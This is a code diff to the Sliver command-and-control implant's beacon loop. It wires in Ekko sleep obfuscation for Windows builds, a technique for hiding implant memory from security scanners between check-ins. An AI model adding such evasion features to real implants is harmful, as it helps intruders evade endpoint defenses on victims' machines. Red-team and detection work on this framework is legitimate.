@@ -50,6 +50,9 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/implant/sliver/version"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+	"github.com/bishopfox/sliver/implant/sliver/ekko"
+	// {{end}}
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -304,6 +307,10 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	// forever it will simply block this set of tasks instead of the entire beacon
 	errors := make(chan error)
 	shortCircuit := make(chan struct{})
+	// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+	completion := make(chan bool)
+	// {{end}}
+
 	for {
 		duration := beacon.Duration()
 		nextCheckin = time.Now().Add(duration)
@@ -320,6 +327,10 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 				// the current sleep and tell the server when the next checkin will
 				// be based on the new interval.
 				shortCircuit <- struct{}{}
+			} else { // err is nil
+			// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+				completion <- true
+			// {{end}}
 			}
 		}()
 
@@ -329,7 +340,17 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		select {
 		case <-errors:
 			return err
+		// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+		case <-completion:
+			// check if there's still time to sleep
+			timeUntilNextCheckIn := time.Until(nextCheckin)
+			if timeUntilNextCheckIn.Seconds() > 1 {
+				_ = 0
+				ekko.EkkoSleep(uint64(timeUntilNextCheckIn.Milliseconds()))
+			}
+		// {{else}}
 		case <-time.After(duration):
+		// {{end}}
 		case <-shortCircuit:
 			// Short circuit current duration with no error
 		}
